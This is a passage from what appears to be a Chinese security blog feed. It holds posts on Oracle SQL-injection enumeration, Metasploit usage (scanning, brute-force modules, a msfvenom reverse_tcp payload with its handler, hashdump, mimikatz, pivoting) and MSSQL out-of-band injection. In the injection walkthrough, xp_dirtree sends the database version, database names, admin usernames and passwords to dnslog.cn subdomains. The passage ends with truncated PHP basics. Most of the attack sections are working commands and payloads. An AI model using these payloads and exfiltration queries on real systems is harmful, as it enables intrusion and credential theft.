默认接dual</p><table><thead><tr><th>视图表</th><th>列名</th><th></th></tr></thead><tbody><tr><td>all_tables</td><td>owner               库名  重复 需要<br/>table_name      表名</td><td></td></tr><tr><td>all_tab_columns</td><td>owner                库名<br/>table_name      表名<br/>column_name 字段</td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p><strong>拼接:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">concat 只能拼字符串</span><br><span class="line">||拼列 查询*</span><br></pre></td></tr></table></figure><p><strong>注释符号:</strong> –</p><p><strong>示例:</strong></p><p><strong>all_tables</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> owner <span class="keyword">from</span> all_tables </span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">where</span> owner<span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">where</span> owner<span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;ADMIN&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>all_tab_columns</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name  <span class="keyword">from</span> all_tab_columns <span class="keyword">where</span> owner<span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span></span><br><span class="line"><span class="keyword">select</span> column_name  <span class="keyword">from</span> all_tab_columns <span class="keyword">where</span> owner<span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name<span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>limit:rownum</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum <span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&#x27;SYS&#x27;</span> <span class="operator">/</span><span class="operator">/</span>伪列 rownum</span><br><span class="line"><span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum <span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;SYSTEM&#x27;</span>,<span class="string">&#x27;XDB&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>Time-bool:</strong> </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">THEN</span> dbms_pipe.receive_message(<span class="string">&#x27;123&#x27;</span>,<span class="number">10</span>) <span class="keyword">END</span> <span class="number">123</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf常用模块</title>
      <link href="/posts/8065/"/>
      <url>/posts/8065/</url>
      
        <content type="html"><![CDATA[<blockquote><p>主机信息收集</p></blockquote><p>使用<code>auxiliary/scanner/discovery/</code>下模块进行扫描</p><p>模块有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">use auxiliary/scanner/discovery/empty_udp</span><br><span class="line">use auxiliary/scanner/discovery/ipv6_multicast_ping</span><br><span class="line">use auxiliary/scanner/discovery/ipv6_neighbor</span><br><span class="line">use auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement</span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br><span class="line"></span><br><span class="line">自动寻找存在的提权漏洞</span><br><span class="line">post/multi/recon/local_exploit_suggest</span><br><span class="line">windows/local/bypassuac_dotnet_profiler</span><br></pre></td></tr></table></figure><blockquote><p>主机服务扫描</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/arp_sweep 基于arp发现内网存活主机</span><br><span class="line">auxiliary/scanner/discovery/udp_sweep 基于udp发现内网存活主机</span><br><span class="line">auxiliary/scanner/portscan/tcp 基于tcp端口扫描发现内网存活主机</span><br><span class="line">auxiliary/scanner/ftp/ftp_version 基于ftp_version发现ftp服务</span><br><span class="line">auxiliary/scanner/http/http_version 基于http_version发现http服务</span><br><span class="line">auxiliary/scanner/smb/smb_version 基于smb_version发现smb服务</span><br><span class="line">auxiliary/scanner/ssh/ssh_version 基于ssh_version发现ssh服务</span><br><span class="line">auxiliary/scanner/telnet/telnet_version 基于telnet_version发现telnet服务</span><br><span class="line">auxiliary/scanner/mysql/mysql_version 基于mysql_version发现mysql服务</span><br></pre></td></tr></table></figure><blockquote><p>主机端口扫描</p></blockquote><p>使用<code>auxiliary/scanner/portscan/</code>下的模块探测主机端口</p><p>模块有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ack       //ACK防火墙扫描</span><br><span class="line">auxiliary/scanner/portscan/ftpbounce // FTP跳端口扫描</span><br><span class="line">auxiliary/scanner/portscan/syn       //SYN端口扫描</span><br><span class="line">auxiliary/scanner/portscan/tcp       //TCP端口扫描</span><br><span class="line">auxiliary/scanner/portscan/xmas      //TCP”XMas”端口扫描</span><br><span class="line"></span><br><span class="line">run arp_scanner -r 10.10.10.0/24 </span><br></pre></td></tr></table></figure><blockquote><p>SMB登录扫描</p></blockquote><p>使用<code>auxiliary/scanner/smb/</code>下的模块进行SMB相关操作</p><p>模块有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smb/pipe_auditor</span><br><span class="line">auxiliary/scanner/smb/pipe_dcerpc_auditor    //返回DCERPC信息</span><br><span class="line">auxiliary/scanner/smb/psexec_loggedin_users  </span><br><span class="line">auxiliary/scanner/smb/smb2                   //扫描SMB2协议</span><br><span class="line">auxiliary/scanner/smb/smb_enum_gpp           </span><br><span class="line">auxiliary/scanner/smb/smb_enumshares         //扫描smb共享文件</span><br><span class="line">auxiliary/scanner/smb/smb_enumusers          //smb枚举系统用户</span><br><span class="line">auxiliary/scanner/smb/smb_enumusers_domain   </span><br><span class="line">auxiliary/scanner/smb/smb_login              //SMB登录</span><br><span class="line">auxiliary/scanner/smb/smb_lookupsid          //扫描组的用户</span><br><span class="line">auxiliary/scanner/smb/smb_uninit_cred        </span><br><span class="line">auxiliary/scanner/smb/smb_version            //扫描系统版本</span><br></pre></td></tr></table></figure><blockquote><p>SQLSERVER登录扫描</p></blockquote><p>使用<code>auxiliary/scanner/mssql/</code>下的模块探测SQL server的信息</p><p>模块有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/mssql/mssql_hashdump  //dump密码hash</span><br><span class="line">auxiliary/scanner/mssql/mssql_login     //密码爆破</span><br><span class="line">auxiliary/scanner/mssql/mssql_ping      //嗅探</span><br><span class="line">auxiliary/scanner/mssql/mssql_schemadump</span><br></pre></td></tr></table></figure><blockquote><p>SSH探测扫描</p></blockquote><p>使用<code>auxiliary/scanner/ssh/</code>下的模块探测ssh信息</p><p>模块有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ssh/cerberus_sftp_enumusers</span><br><span class="line">auxiliary/scanner/ssh/detect_kippo</span><br><span class="line">auxiliary/scanner/ssh/ssh_enumusers     //枚举用户</span><br><span class="line">auxiliary/scanner/ssh/ssh_identify_pubkeys</span><br><span class="line">auxiliary/scanner/ssh/ssh_login         //密码爆破</span><br><span class="line">auxiliary/scanner/ssh/ssh_login_pubkey</span><br><span class="line">auxiliary/scanner/ssh/ssh_version       //查看版本</span><br></pre></td></tr></table></figure><blockquote><p>FTP探测扫描</p></blockquote><p>使用<code>auxiliary/scanner/ftp/</code>下的模块探测ftp信息</p><p>模块有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ftp/anonymous         </span><br><span class="line">auxiliary/scanner/ftp/bison_ftp_traversal</span><br><span class="line">auxiliary/scanner/ftp/ftp_login         //密码爆破</span><br><span class="line">auxiliary/scanner/ftp/ftp_version       //查看版本</span><br><span class="line">auxiliary/scanner/ftp/konica_ftp_traversal</span><br><span class="line">auxiliary/scanner/ftp/pcman_ftp_traversal</span><br><span class="line">auxiliary/scanner/ftp/titanftp_xcrc_traversal</span><br></pre></td></tr></table></figure><blockquote><p>MYSQL探测扫描</p></blockquote><p>使用<code>auxiliary/scanner/mysql/</code>下的模块探测mysql信息</p><p>模块有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">auxiliary/scanner/mysql/mysql_file_enum</span><br><span class="line">auxiliary/scanner/mysql/mysql_hashdump   //dump密码hash</span><br><span class="line">auxiliary/scanner/mysql/mysql_login      //密码爆破</span><br><span class="line">auxiliary/scanner/mysql/mysql_schemadump</span><br><span class="line">auxiliary/scanner/mysql/mysql_version    //查看版本</span><br></pre></td></tr></table></figure><h2 id="内网操作基本步骤流程"><a href="#内网操作基本步骤流程" class="headerlink" title="内网操作基本步骤流程"></a>内网操作基本步骤流程</h2><blockquote><p>制作msf回连木马</p></blockquote><p>当获得webshell的时候，我们制作一个msf木马来进行回连</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=443 =F exe &gt;/root/Desktop/443.exe</span><br></pre></td></tr></table></figure><blockquote><p>回连准备</p></blockquote><p>打开msfconsole，准备进行回连</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler                     //使用后门模块</span><br><span class="line">set payload windows/meterpreter/reverse_tcp   //设置payload</span><br><span class="line">show options                   </span><br><span class="line">set LHOST 192.168.1.1                         //设置回连地址</span><br><span class="line">set lport 443                                 //设置回连端口</span><br><span class="line">exploit -j -z    //后台运行</span><br></pre></td></tr></table></figure><blockquote><p>查看基本情况</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getuid     //查看当前用户</span><br><span class="line">getsystem  //提权</span><br></pre></td></tr></table></figure><blockquote><p>提权</p></blockquote><p><code>background</code> 或 <code>ctrl+z</code><br>将回连的meterpreter放入session中 sessions ­i 号 叫回session 在msf下use exploit/windows/local/ TAB 可以列出所有的可提权的模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; use exploit/windows/local/             //调用windows的本地模块</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>密码获取与解密</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashdump      //密码获取</span><br><span class="line">load mimikatz //使用mimikatz</span><br><span class="line">kerberos      //查看解密</span><br></pre></td></tr></table></figure><blockquote><p>新路由查看子网</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">route         //查看路由</span><br><span class="line">background </span><br><span class="line">sessions </span><br><span class="line">route add 192.168.2.0 255.255.255.0 2    //路由添加</span><br><span class="line">search mssql   //找mssql模块</span><br><span class="line">use auxiliary/scanner/mssql/mssql_login  //使用login模块</span><br></pre></td></tr></table></figure><blockquote><p>查看机器是否是虚拟机</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure><p><strong>监听:</strong></p><p>msf走代理:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks4:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:[port]</span><br><span class="line">setg ReverseAllowProxy <span class="literal">true</span></span><br><span class="line">unsetg Proxies    <span class="comment">//取消代理</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> MSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mssql DNSlog外带注入</title>
      <link href="/posts/54040/"/>
      <url>/posts/54040/</url>
      
        <content type="html"><![CDATA[<p>利用mysql 存储过程 xp_dirtree,是一个列目录的mssql函数, 结合 \\ Smb(文件共享)资源匹配符来访问 dns解析域名.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);    <span class="comment">--定义一个变量</span></span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;\\&#x27;</span><span class="operator">+</span>master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), <span class="built_in">substring</span>(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">15</span>)))<span class="operator">+</span><span class="string">&#x27;.j2bg99.dnslog.cn&#x27;</span>;    <span class="operator">/</span><span class="operator">/</span>变量赋值</span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="variable">@a</span>;         <span class="operator">/</span><span class="operator">/</span>执行变量</span><br></pre></td></tr></table></figure><p>查库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;\\&#x27;</span><span class="operator">+</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases <span class="keyword">where</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">0</span> name <span class="keyword">from</span> master.dbo.sysdatabases))<span class="operator">+</span><span class="string">&#x27;.vgx3xe.dnslog.cn&#x27;</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="variable">@a</span>; </span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;\\&#x27;</span><span class="operator">+</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases <span class="keyword">where</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">3</span> name <span class="keyword">from</span> master.dbo.sysdatabases))<span class="operator">+</span><span class="string">&#x27;.vgx3xe.dnslog.cn&#x27;</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="variable">@a</span>; </span><br></pre></td></tr></table></figure><p><img src="C:/Users/zlb/AppData/Roaming/Typora/typora-user-images/image-20220217193529043.png" alt="image-20220217193529043"></p><p>跑[22]表名:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;\\&#x27;</span><span class="operator">+</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> [<span class="number">22</span>].dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="type">char</span>(<span class="number">85</span>) <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> [<span class="number">22</span>].dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="type">char</span>(<span class="number">85</span>)))<span class="operator">+</span><span class="string">&#x27;.bsd2ig.dnslog.cn&#x27;</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="variable">@a</span>;</span><br></pre></td></tr></table></figure><p>跑[22].DB_Admin字段:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> [<span class="number">22</span>].dbo.syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> id <span class="keyword">from</span> [<span class="number">22</span>].dbo.sysobjects <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;DB_Admin&#x27;</span>) <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> [<span class="number">22</span>].dbo.syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> id <span class="keyword">from</span> [<span class="number">22</span>].dbo.sysobjects <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;DB_Admin&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;\\&#x27;</span><span class="operator">+</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> [<span class="number">22</span>].dbo.syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> id <span class="keyword">from</span> [<span class="number">22</span>].dbo.sysobjects <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;DB_Admin&#x27;</span>) <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> [<span class="number">22</span>].dbo.syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> id <span class="keyword">from</span> [<span class="number">22</span>].dbo.sysobjects <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;DB_Admin&#x27;</span>)))<span class="operator">+</span><span class="string">&#x27;.vnyhmg.dnslog.cn&#x27;</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="variable">@a</span>;</span><br></pre></td></tr></table></figure><p>跑[22].DB_Admin内容:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;\\&#x27;</span><span class="operator">+</span>(<span class="keyword">select</span> top <span class="number">1</span> UserName <span class="keyword">from</span> [<span class="number">22</span>].dbo.DB_Admin)<span class="operator">+</span><span class="string">&#x27;.vnyhmg.dnslog.cn&#x27;</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="variable">@a</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;\\&#x27;</span><span class="operator">+</span>(<span class="keyword">select</span> top <span class="number">1</span> PassWord <span class="keyword">from</span> [<span class="number">22</span>].dbo.DB_Admin)<span class="operator">+</span><span class="string">&#x27;.vnyhmg.dnslog.cn&#x27;</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="variable">@a</span>;</span><br></pre></td></tr></table></figure><p>解密后密码为123456</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php基础语法</title>
      <link href="/posts/54224/"/>
      <url>/posts/54224/</url>
      
        <content type="html"><![CDATA[<h2 id="三种标签"><a href="#三种标签" class="headerlink" title="三种标签"></a>三种标签</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;我是scriptphp&quot;</span>  <span class="meta">?&gt;</span></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">&quot;我是scriptphp&quot;</span> %&gt; <span class="comment">//手动添加改短标签php.ini  phort_ipen_tag:on asp_tag:on</span></span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&quot;我是scriptphp&quot;</span> <span class="meta">?&gt;</span>  <span class="comment">//手动添加改短标签php.ini  phort_ipen_tag:on asp_tag:on</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="number">123</span>;<span class="keyword">echo</span> <span class="string">&quot;我是scriptphp&quot;</span> <span class="meta">?&gt;</span>  <span class="comment">//大部分网站可用    </span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">echo</span> <span class="string">&quot;我是scriptphp&quot;</span>&lt;/script&gt;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">**/</span> </span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">  hhhhhh</span></span><br><span class="line"><span class="string">EOF</span>?</span><br><span class="line">    &gt;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span></span><br><span class="line"><span class="keyword">print</span>       </span><br><span class="line">var_dump   <span class="comment">//输出变量类型</span></span><br><span class="line">print_r    <span class="comment">//打印数组</span></span><br><span class="line">printf</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;dd&quot;</span>) <span class="comment">//退出的意思</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br></pre></td></tr></table></figure><h2 id="变量的定义"><a href="#变量的定义" class="headerlink" title="变量的定义"></a>变量的定义</h2><ul><li><p>变量以$开头</p></li><li><p>系统变量以$_GET开头</p></li><li><p>变量区分大小写</p></li><li><p>变量名只能字母或者下划线开头</p></li><li><p>赋值变量可不必声明变量的数据类型</p></li></ul><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>递增递减运算</p><ul><li>只能用于变量</li></ul><table><thead><tr><th align="left">运算符</th><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">++ x$</td><td align="left">预递增</td><td align="left">x 加 1，然后返回 x</td></tr><tr><td align="left">$x ++</td><td align="left">后递增</td><td align="left">返回 x，然后 x 加 1</td></tr><tr><td align="left">– x$</td><td align="left">预递减</td><td align="left">x 减 1，然后返回 x</td></tr><tr><td align="left">$x –</td><td align="left">后递减</td><td align="left">返回 x，然后 x 减 1</td></tr></tbody></table><table><thead><tr><th>运算符</th><th>名称</th><th>等同于</th><th>描述</th></tr></thead><tbody><tr><td>==</td><td>等于</td><td>$x==$y</td><td>如果$x等于$y,返回true</td></tr><tr><td>===</td><td>全等于（完全相同）</td><td>$x===$y</td><td>如果$x等于$y,且类型相同返回true</td></tr><tr><td>!=</td><td>不等于</td><td>$x!=$y</td><td>如果$x不等于$y,返回true</td></tr><tr><td>&lt;&gt;</td><td>不等于</td><td>$x&lt;&gt;$y</td><td>如果$x不等于$y,返回true</td></tr><tr><td>!==</td><td>不全等（属性和值都不等于）</td><td>$x!==$y</td><td>如果$x不等于$y,且类型不相同返回true</td></tr><tr><td>&gt;</td><td>大于</td><td>$x&gt;$y</td><td>如果$x大于$y,返回true</td></tr><tr><td>&lt;</td><td>小于</td><td>$x&lt;$y</td><td>如果$x小于$y,返回true</td></tr><tr><td>&gt;=</td><td>大于或等于</td><td>$x&gt;=$y</td><td>如果$x大于等于$y,返回true</td></tr><tr><td>&lt;=</td><td>小于或等于</td><td>$x&lt;=$y</td><td>如果$x小于等于$y,返回true</td></tr><tr><td>and,&amp;&amp;</td><td>与</td><td>$x and$y</td><td>如果$x和$y都为true，则返回true</td></tr><tr><td>or,||</td><td>或</td><td>$x or $y</td><td>如果$x和$y至少1个为true，则返回true</td></tr><tr><td>not,!</td><td>非</td><td>!$x</td><td>如果$x不为true，则返回true</td></tr><tr><td>xor</td><td>异或</td><td>$x xor $y</td><td>如果$x和$y有且仅有1个为true，则返回true</td></tr></tbody></table><h2 id="数组的创建和读取"><a href="#数组的创建和读取" class="headerlink" title="数组的创建和读取"></a>数组的创建和读取</h2><p>创建数组的基本方法是应用array()函数</p><ul><li>索引数组  key为连续的整数，默认从下标0开始。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 